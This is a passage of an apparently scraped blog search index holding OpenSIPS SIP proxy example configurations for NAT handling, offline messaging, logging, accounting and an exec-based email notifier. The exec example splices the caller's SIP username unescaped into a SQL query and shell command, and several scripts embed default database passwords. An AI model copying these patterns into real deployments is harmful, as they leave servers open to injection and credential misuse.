*/ # filter too old messages if (!","title":"pstn"},{"content":"# # simple quick-start config script including nathelper support # This default script includes nathelper support. To make it work # you will also have to install Maxim\u0026#39;s RTP proxy. The proxy is enforced # if one of the parties is behind a NAT. # # If you have an endpoing in the public internet which is known to # support symmetric RTP (Cisco PSTN gateway or voicemail, for example), # then you don\u0026#39;t have to force RTP proxy. If you don\u0026#39;t want to enforce # RTP proxy for some destinations than simply use t_relay() instead of # route(1) # # Sections marked with !! Nathelper contain modifications for nathelper # # NOTE !! This config is EXPERIMENTAL ! # # ----------- global configuration parameters ------------------------ log_level=3 # logging level (cmd line: -dddddddddd) log_stderror=no # (cmd line: -E) /* Uncomment these lines to enter debugging mode */ #debug_mode=yes check_via=no\t# (cmd. line: -v) dns=no # (cmd. line: -r) rev_dns=no # (cmd. line: -R) port=5060 children=4 # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database #loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;signaling.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;textops.so\u0026#34; loadmodule \u0026#34;mi_fifo.so\u0026#34; # Uncomment this if you want digest authentication # db_mysql.so must be loaded ! #loadmodule \u0026#34;auth.so\u0026#34; #loadmodule \u0026#34;auth_db.so\u0026#34; # !! Nathelper loadmodule \u0026#34;nathelper.so\u0026#34; loadmodule \u0026#34;rtpproxy.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- mi_fifo params -- modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) # -- usrloc params -- modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) # Uncomment this if you want to use SQL database # for persistent storage and comment the previous line #modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 2) # -- auth params -- # Uncomment if you are using auth module #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;calculate_ha1\u0026#34;, yes) # # If you set \u0026#34;calculate_ha1\u0026#34; parameter to yes (which true in this config), # uncomment also the following parameter) #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;password_column\u0026#34;, \u0026#34;password\u0026#34;) # !! Nathelper modparam(\u0026#34;usrloc\u0026#34;,\u0026#34;nat_bflag\u0026#34;,6) modparam(\u0026#34;nathelper\u0026#34;,\u0026#34;sipping_bflag\u0026#34;,8) modparam(\u0026#34;nathelper\u0026#34;, \u0026#34;ping_nated_only\u0026#34;, 1) # Ping only clients behind NAT # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwards==0, or excessively long requests if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; # !! Nathelper # Special handling for NATed clients; first, NAT test is # executed: it looks for via!=received and RFC1918 addresses # in Contact (may fail if line-folding is used); also, # the received test should, if completed, should check all # vias for rpesence of received if (nat_uac_test(\u0026#34;3\u0026#34;)) { # Allow RR-ed requests, as these may indicate that # a NAT-enabled proxy takes care of it; unless it is # a REGISTER if (is_method(\u0026#34;REGISTER\u0026#34;) || !is_present_hf(\u0026#34;Record-Route\u0026#34;)) { log(\u0026#34;LOG:Someone trying to register from private IP, rewriting\\n\u0026#34;); # This will work only for user agents that support symmetric # communication. We tested quite many of them and majority is # smart enough to be symmetric. In some phones it takes a # configuration option. With Cisco 7960, it is called # NAT_Enable=Yes, with kphone it is called \u0026#34;symmetric media\u0026#34; and # \u0026#34;symmetric signalling\u0026#34;. # Rewrite contact with source IP of signalling fix_nated_contact(); if ( is_method(\u0026#34;INVITE\u0026#34;) ) { fix_nated_sdp(\u0026#34;1\u0026#34;); # Add direction=active to SDP }; force_rport(); # Add rport parameter to topmost Via setbflag(6); # Mark as NATed # if you want sip nat pinging # setbflag(8); }; }; # subsequent messages withing a dialog should take the # path determined by record-routing if (loose_route()) { # mark routing logic in request append_hf(\u0026#34;P-hint: rr-enforced\\r\\n\u0026#34;); route(1); exit; }; # we record-route all messages -- to make sure that # subsequent messages will go through our proxy; that\u0026#39;s # particularly good if upstream and downstream entities # use different transport protocol if (!is_method(\u0026#34;REGISTER\u0026#34;)) record_route(); if (!is_myself(\u0026#34;$rd\u0026#34;)) { # mark routing logic in request append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(1); exit; }; # if the request is for other domain use UsrLoc # (in case, it does not work, use the following command # with proper names and addresses in it) if (is_myself(\u0026#34;$rd\u0026#34;)) { if (is_method(\u0026#34;REGISTER\u0026#34;)) { # Uncomment this if you want to use digest authentication #if (!www_authorize(\u0026#34;siphub.org\u0026#34;, \u0026#34;subscriber\u0026#34;)) { #\twww_challenge(\u0026#34;siphub.org\u0026#34;, \u0026#34;0\u0026#34;); #\treturn; #}; save(\u0026#34;location\u0026#34;); exit; }; lookup(\u0026#34;aliases\u0026#34;); if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound alias\\r\\n\u0026#34;); route(1); exit; }; # native SIP destinations are handled using our USRLOC DB if (!lookup(\u0026#34;location\u0026#34;)) { sl_send_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; }; }; append_hf(\u0026#34;P-hint: usrloc applied\\r\\n\u0026#34;); route(1); } route[1] { # !! Nathelper if ($ru=~\u0026#34;[@:](192\\.168\\.|10\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.)\u0026#34; \u0026amp;\u0026amp; !search(\u0026#34;^Route:\u0026#34;)){ sl_send_reply(\u0026#34;479\u0026#34;, \u0026#34;We don\u0026#39;t forward to private IP addresses\u0026#34;); exit; }; # if client or server know to be behind a NAT, enable relay if (isbflagset(6)) { rtpproxy_offer(); }; # NAT processing of replies; apply to all transactions (for example, # re-INVITEs from public to private UA are hard to identify as # NATed at the moment of request processing); look at replies t_on_reply(\u0026#34;1\u0026#34;); # send it out now; use stateful forwarding as it works reliably # even for UDP2TCP if (!t_relay()) { sl_reply_error(); }; } # !! Nathelper onreply_route[1] { # NATed transaction ? if (isbflagset(6) \u0026amp;\u0026amp; $rs =~ \u0026#34;(183)|2[0-9][0-9]\u0026#34;) { fix_nated_contact(); rtpproxy_answer(); # otherwise, is it a transaction behind a NAT and we did not # know at time of request processing ? (RFC1918 contacts) } else if (nat_uac_test(\u0026#34;1\u0026#34;)) { fix_nated_contact(); }; } ","permalink":"https://wdd.js.org/opensips/ch8/nathelper/","summary":"# # simple quick-start config script including nathelper support # This default script includes nathelper support. To make it work # you will also have to install Maxim\u0026#39;s RTP proxy. The proxy is enforced # if one of the parties is behind a NAT. # # If you have an endpoing in the public internet which is known to # support symmetric RTP (Cisco PSTN gateway or voicemail, for example), # then you don\u0026#39;t have to force RTP proxy.","title":"nathelper"},{"content":"# # MSILO usage example # # $ID: daniel $ # children=2 check_via=no # (cmd. line: -v) dns=off # (cmd. line: -r) rev_dns=off # (cmd. line: -R) # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;textops.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;msilo.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- registrar params -- modparam(\u0026#34;registrar\u0026#34;, \u0026#34;default_expires\u0026#34;, 120) # -- usrloc params -- modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) # -- msilo params -- modparam(\u0026#34;msilo\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) # -- tm params -- modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timer\u0026#34;, 10 ) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timer\u0026#34;, 15 ) modparam(\u0026#34;tm\u0026#34;, \u0026#34;wt_timer\u0026#34;, 10 ) route{ if ( !mf_process_maxfwd_header(\u0026#34;10\u0026#34;) ) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;To Many Hops\u0026#34;); exit; }; if (is_myself(\u0026#34;$rd\u0026#34;)) { # for testing purposes, simply okay all REGISTERs # is_method(\u0026#34;XYZ\u0026#34;) is faster than ($rm==\u0026#34;XYZ\u0026#34;) # but requires textops module if (is_method(\u0026#34;REGISTER\u0026#34;)) { save(\u0026#34;location\u0026#34;); log(\u0026#34;REGISTER received -\u0026gt; dumping messages with MSILO\\n\u0026#34;); # MSILO - dumping user\u0026#39;s offline messages if (m_dump()) { log(\u0026#34;MSILO: offline messages dumped - if they were\\n\u0026#34;); } else { log(\u0026#34;MSILO: no offline messages dumped\\n\u0026#34;); }; exit; }; # backup r-uri for m_dump() in case of delivery failure $avp(11) = $ru; # domestic SIP destinations are handled using our USRLOC DB if(!lookup(\u0026#34;location\u0026#34;)) { if (! t_newtran()) { sl_reply_error(); exit; }; # we do not care about anything else but MESSAGEs if (!is_method(\u0026#34;MESSAGE\u0026#34;)) { if (!t_reply(\u0026#34;404\u0026#34;, \u0026#34;Not found\u0026#34;)) { sl_reply_error(); }; exit; }; log(\u0026#34;MESSAGE received -\u0026gt; storing using MSILO\\n\u0026#34;); # MSILO - storing as offline message if (m_store(\u0026#34;$ru\u0026#34;)) { log(\u0026#34;MSILO: offline message stored\\n\u0026#34;); if (!t_reply(\u0026#34;202\u0026#34;, \u0026#34;Accepted\u0026#34;)) { sl_reply_error(); }; }else{ log(\u0026#34;MSILO: offline message NOT stored\\n\u0026#34;); if (!t_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;)) { sl_reply_error(); }; }; exit; }; # if the downstream UA does not support MESSAGE requests # go to failure_route[1] t_on_failure(\u0026#34;1\u0026#34;); t_relay(); exit; }; # forward anything else t_relay(); } failure_route[1] { # forwarding failed -- check if the request was a MESSAGE if (!is_method(\u0026#34;MESSAGE\u0026#34;)) exit; log(1,\u0026#34;MSILO: the downstream UA does not support MESSAGE requests ...\\n\u0026#34;); # we have changed the R-URI with the contact address -- ignore it now if (m_store(\u0026#34;$avp(11)\u0026#34;)) { log(\u0026#34;MSILO: offline message stored\\n\u0026#34;); t_reply(\u0026#34;202\u0026#34;, \u0026#34;Accepted\u0026#34;); }else{ log(\u0026#34;MSILO: offline message NOT stored\\n\u0026#34;); t_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); }; } ","permalink":"https://wdd.js.org/opensips/ch8/msilo/","summary":"# # MSILO usage example # # $ID: daniel $ # children=2 check_via=no # (cmd. line: -v) dns=off # (cmd. line: -r) rev_dns=off # (cmd. line: -R) # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;textops.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;msilo.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- registrar params -- modparam(\u0026#34;registrar\u0026#34;, \u0026#34;default_expires\u0026#34;, 120) # -- usrloc params -- modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) # -- msilo params -- modparam(\u0026#34;msilo\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) # -- tm params -- modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timer\u0026#34;, 10 ) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timer\u0026#34;, 15 ) modparam(\u0026#34;tm\u0026#34;, \u0026#34;wt_timer\u0026#34;, 10 ) route{ if ( !","title":"msilo"},{"content":"# # logging example # # ------------------ module loading ---------------------------------- port=5060 log_stderror=yes log_level=3 # ------------------------- request routing logic ------------------- # main routing logic route{ # for testing purposes, simply okay all REGISTERs if (is_method(\u0026#34;REGISTER\u0026#34;)) { log(1, \u0026#34;REGISTER received\\n\u0026#34;); } else { log(1, \u0026#34;non-REGISTER received\\n\u0026#34;); }; if ($ru=~\u0026#34;sip:.*[@:]siphub.net\u0026#34;) { xlog(\u0026#34;request for siphub.net received\\n\u0026#34;); } else { xlog(\u0026#34;request for other domain [$rd] received\\n\u0026#34;); }; } ","permalink":"https://wdd.js.org/opensips/ch8/logging/","summary":"# # logging example # # ------------------ module loading ---------------------------------- port=5060 log_stderror=yes log_level=3 # ------------------------- request routing logic ------------------- # main routing logic route{ # for testing purposes, simply okay all REGISTERs if (is_method(\u0026#34;REGISTER\u0026#34;)) { log(1, \u0026#34;REGISTER received\\n\u0026#34;); } else { log(1, \u0026#34;non-REGISTER received\\n\u0026#34;); }; if ($ru=~\u0026#34;sip:.*[@:]siphub.net\u0026#34;) { xlog(\u0026#34;request for siphub.net received\\n\u0026#34;); } else { xlog(\u0026#34;request for other domain [$rd] received\\n\u0026#34;); }; } ","title":"loggin"},{"content":"# # $Id$ # # this example shows use of opensips\u0026#39;s provisioning interface # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib64/opensips/modules/\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;httpd.so\u0026#34; modparam(\u0026#34;httpd\u0026#34;, \u0026#34;port\u0026#34;, 8888) loadmodule \u0026#34;mi_http.so\u0026#34; loadmodule \u0026#34;pi_http.so\u0026#34; modparam(\u0026#34;pi_http\u0026#34;, \u0026#34;framework\u0026#34;, \u0026#34;/usr/local/src/opensips/examples/pi_framework.xml\u0026#34;) loadmodule \u0026#34;mi_xmlrpc_ng.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ exit; } ","permalink":"https://wdd.js.org/opensips/ch8/httpd/","summary":"# # $Id$ # # this example shows use of opensips\u0026#39;s provisioning interface # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib64/opensips/modules/\u0026#34; loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;httpd.so\u0026#34; modparam(\u0026#34;httpd\u0026#34;, \u0026#34;port\u0026#34;, 8888) loadmodule \u0026#34;mi_http.so\u0026#34; loadmodule \u0026#34;pi_http.so\u0026#34; modparam(\u0026#34;pi_http\u0026#34;, \u0026#34;framework\u0026#34;, \u0026#34;/usr/local/src/opensips/examples/pi_framework.xml\u0026#34;) loadmodule \u0026#34;mi_xmlrpc_ng.so\u0026#34; # ------------------------- request routing logic ------------------- # main routing logic route{ exit; } ","title":"httpd"},{"content":"# # simple quick-start config script # # ----------- global configuration parameters ------------------------ log_level=3 # logging level (cmd line: -dddddddddd) log_stderror=no # (cmd line: -E) check_via=no\t# (cmd. line: -v) dns=no # (cmd. line: -r) rev_dns=no # (cmd. line: -R) children=4 port=5060 # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database #loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;textops.so\u0026#34; loadmodule \u0026#34;mi_fifo.so\u0026#34; # Uncomment this if you want digest authentication # mysql.so must be loaded ! #loadmodule \u0026#34;auth.so\u0026#34; #loadmodule \u0026#34;auth_db.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- mi_fifo params -- modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) # -- usrloc params -- modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) # Uncomment this if you want to use SQL database # for persistent storage and comment the previous line #modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 2) # -- auth params -- # Uncomment if you are using auth module # #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;calculate_ha1\u0026#34;, yes) # # If you set \u0026#34;calculate_ha1\u0026#34; parameter to yes (which true in this config), # uncomment also the following parameter) # #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;password_column\u0026#34;, \u0026#34;password\u0026#34;) # ------------------------- request routing logic ------------------- # main routing logic route{ setflag(1); t_on_failure(\u0026#34;1\u0026#34;); t_on_reply(\u0026#34;1\u0026#34;); log(1, \u0026#34;message received\\n\u0026#34;); t_relay(\u0026#34;udp:opensips.org:5060\u0026#34;); } onreply_route[1] { if (isflagset(1)) { log(1, \u0026#34;onreply: flag set\\n\u0026#34;); } else { log(1, \u0026#34;onreply: flag unset\\n\u0026#34;); }; } failure_route[1] { if (isflagset(1)) { log(1, \u0026#34;failure: flag set\\n\u0026#34;); } else { log(1, \u0026#34;failure: flag unset\\n\u0026#34;); }; } ","permalink":"https://wdd.js.org/opensips/ch8/flag-reply/","summary":"# # simple quick-start config script # # ----------- global configuration parameters ------------------------ log_level=3 # logging level (cmd line: -dddddddddd) log_stderror=no # (cmd line: -E) check_via=no\t# (cmd. line: -v) dns=no # (cmd. line: -r) rev_dns=no # (cmd. line: -R) children=4 port=5060 # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database #loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.","title":"flag_reply"},{"content":"# # $Id$ # # simple quick-start config script # # ----------- global configuration parameters ------------------------ #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;exec.so\u0026#34; # ----------------- setting module-specific parameters --------------- route{ # uri for my domain ? if (is_myself(\u0026#34;$rd\u0026#34;)) { if ($rm==\u0026#34;REGISTER\u0026#34;) { save(\u0026#34;location\u0026#34;); return; }; # native SIP destinations are handled using our USRLOC DB if (!lookup(\u0026#34;location\u0026#34;)) { # proceed to email notification if ($rm==\u0026#34;INVITE\u0026#34;) route(1) else sl_send_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; }; }; # user found, forward to his current uri now if (!t_relay()) { sl_reply_error(); }; } /* handling of missed calls */ route[1] { # don\u0026#39;t continue if it is a retransmission if ( !t_newtran()) { sl_reply_error(); exit; }; # external script: lookup user, if user exists, send # an email notification to him if (!exec_msg(\u0026#39; QUERY=\u0026#34;select email_address from subscriber where user=\\\u0026#34;$$SIP_OUSER\\\u0026#34;\u0026#34;; EMAIL=`mysql -Bsuser -pheslo -e \u0026#34;$$QUERY\u0026#34; ser`; if [ -z \u0026#34;$$EMAIL\u0026#34; ] ; then exit 1; fi ; echo \u0026#34;SIP request received from $$SIP_HF_FROM for $$SIP_OUSER\u0026#34; | mail -s \u0026#34;request for you\u0026#34; $$EMAIL \u0026#39;)) { # exec returned error ... user does not exist # send a stateful reply t_reply(\u0026#34;404\u0026#34;, \u0026#34;User does not exist\u0026#34;); } else { t_reply(\u0026#34;600\u0026#34;, \u0026#34;No messages for this user\u0026#34;); }; exit; } ","permalink":"https://wdd.js.org/opensips/ch8/exec/","summary":"# # $Id$ # # simple quick-start config script # # ----------- global configuration parameters ------------------------ #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;exec.so\u0026#34; # ----------------- setting module-specific parameters --------------- route{ # uri for my domain ? if (is_myself(\u0026#34;$rd\u0026#34;)) { if ($rm==\u0026#34;REGISTER\u0026#34;) { save(\u0026#34;location\u0026#34;); return; }; # native SIP destinations are handled using our USRLOC DB if (!lookup(\u0026#34;location\u0026#34;)) { # proceed to email notification if ($rm==\u0026#34;INVITE\u0026#34;) route(1) else sl_send_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; }; }; # user found, forward to his current uri now if (!","title":"exec"},{"content":"# # $Id$ # # example: accounting calls to nummerical destinations # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;acc.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- acc params -- # set the reporting log level modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_level\u0026#34;, 1) # number of flag, which will be used for accounting; if a message is # labeled with this flag, its completion status will be reported modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_flag\u0026#34;, 1 ) # ------------------------- request routing logic ------------------- # main routing logic route{ /* ********* ROUTINE CHECKS ********************************** */ # filter too old messages if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { log(\u0026#34;LOG: Too many hops\\n\u0026#34;); sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; if ($ml \u0026gt;= 2048 ) { sl_send_reply(\u0026#34;513\u0026#34;, \u0026#34;Message too big\u0026#34;); exit; }; # Process record-routing if (loose_route()) { # label BYEs for accounting if (is_method(\u0026#34;BYE\u0026#34;)) setflag(1); t_relay(); exit; }; # labeled all transaction for accounting setflag(1); # record-route INVITES to make sure BYEs will visit our server too if (is_method(\u0026#34;INVITE\u0026#34;)) record_route(); # forward the request statefuly now; (we need *stateful* forwarding, # because the stateful mode correlates requests with replies and # drops retranmissions; otherwise, we would have to report on # every single message received) if (!t_relay()) { sl_reply_error(); exit; }; } ","permalink":"https://wdd.js.org/opensips/ch8/acc/","summary":"# # $Id$ # # example: accounting calls to nummerical destinations # # ------------------ module loading ---------------------------------- #set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;acc.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- acc params -- # set the reporting log level modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_level\u0026#34;, 1) # number of flag, which will be used for accounting; if a message is # labeled with this flag, its completion status will be reported modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_flag\u0026#34;, 1 ) # ------------------------- request routing logic ------------------- # main routing logic route{ /* ********* ROUTINE CHECKS ********************************** */ # filter too old messages if (!","title":"acc"},{"content":"# # Sample config for MySQL accouting with OpenSIPS # # - db_mysql module must be compiled and installed # # - new columns have to be added since by default only few are recorded # - here are full SQL statements to create acc and missed_calls tables # # CREATE TABLE `acc` ( # `id` int(10) unsigned NOT NULL auto_increment, # `method` varchar(16) NOT NULL default \u0026#39;\u0026#39;, # `from_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `to_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `callid` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `sip_code` char(3) NOT NULL default \u0026#39;\u0026#39;, # `sip_reason` varchar(32) NOT NULL default \u0026#39;\u0026#39;, # `time` datetime NOT NULL default \u0026#39;0000-00-00 00:00:00\u0026#39;, # `src_ip` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `src_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `src_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # INDEX acc_callid (`callid`), # PRIMARY KEY (`id`) # ); # # CREATE TABLE `missed_calls` ( # `id` int(10) unsigned NOT NULL auto_increment, # `method` varchar(16) NOT NULL default \u0026#39;\u0026#39;, # `from_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `to_tag` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `callid` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `sip_code` char(3) NOT NULL default \u0026#39;\u0026#39;, # `sip_reason` varchar(32) NOT NULL default \u0026#39;\u0026#39;, # `time` datetime NOT NULL default \u0026#39;0000-00-00 00:00:00\u0026#39;, # `src_ip` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `dst_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # `src_user` varchar(64) NOT NULL default \u0026#39;\u0026#39;, # `src_domain` varchar(128) NOT NULL default \u0026#39;\u0026#39;, # INDEX acc_callid (`callid`), # PRIMARY KEY (`id`) # ); # # # ----------- global configuration parameters ------------------------ log_level=3 # debug level (cmd line: -dddddddddd) log_stderror=no # (cmd line: -E) /* Uncomment these lines to enter debugging mode */ #debug_mode=yes check_via=no\t# (cmd. line: -v) dns=no # (cmd. line: -r) rev_dns=no # (cmd. line: -R) port=5060 children=4 # # uncomment the following lines for TLS support #disable_tls = 0 #listen = tls:your_IP:5061 #tls_verify_server = 1 #tls_verify_client = 1 #tls_require_client_certificate = 0 #tls_method = TLSv1 #tls_certificate = \u0026#34;/usr/local/etc/opensips/tls/user/user-cert.pem\u0026#34; #tls_private_key = \u0026#34;/usr/local/etc/opensips/tls/user/user-privkey.pem\u0026#34; #tls_ca_list = \u0026#34;/usr/local/etc/opensips/tls/user/user-calist.pem\u0026#34; # ------------------ module loading ---------------------------------- # set module path mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; # Uncomment this if you want to use SQL database # - MySQL loaded for accounting as well loadmodule \u0026#34;db_mysql.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;maxfwd.so\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;textops.so\u0026#34; loadmodule \u0026#34;acc.so\u0026#34; loadmodule \u0026#34;mi_fifo.so\u0026#34; # Uncomment this if you want digest authentication # db_mysql.so must be loaded ! #loadmodule \u0026#34;auth.so\u0026#34; #loadmodule \u0026#34;auth_db.so\u0026#34; # ----------------- setting module-specific parameters --------------- # -- mi_fifo params -- modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) # -- usrloc params -- #modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) # Uncomment this if you want to use SQL database # for persistent storage and comment the previous line modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 2) # -- auth params -- # Uncomment if you are using auth module # #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;calculate_ha1\u0026#34;, yes) # # If you set \u0026#34;calculate_ha1\u0026#34; parameter to yes (which true in this config), # uncomment also the following parameter) # #modparam(\u0026#34;auth_db\u0026#34;, \u0026#34;password_column\u0026#34;, \u0026#34;password\u0026#34;) # -- acc params -- modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) # flag to record to db modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_flag\u0026#34;, 1) modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_missed_flag\u0026#34;, 2) # flag to log to syslog modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_flag\u0026#34;, 1) modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_missed_flag\u0026#34;, 2) # use extra accounting to record caller and callee username/domain # - take them from From URI and R-URI modparam(\u0026#34;acc\u0026#34;, \u0026#34;log_extra\u0026#34;, \u0026#34;src_user=$fU;src_domain=$fd;dst_user=$rU;dst_domain=$rd\u0026#34;) modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_extra\u0026#34;, \u0026#34;src_user=$fU;src_domain=$fd;dst_user=$rU;dst_domain=$rd\u0026#34;) # ------------------------- request routing logic ------------------- # main routing logic route{ # initial sanity checks -- messages with # max_forwards==0, or excessively long requests if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; }; # subsequent messages withing a dialog should take the # path determined by 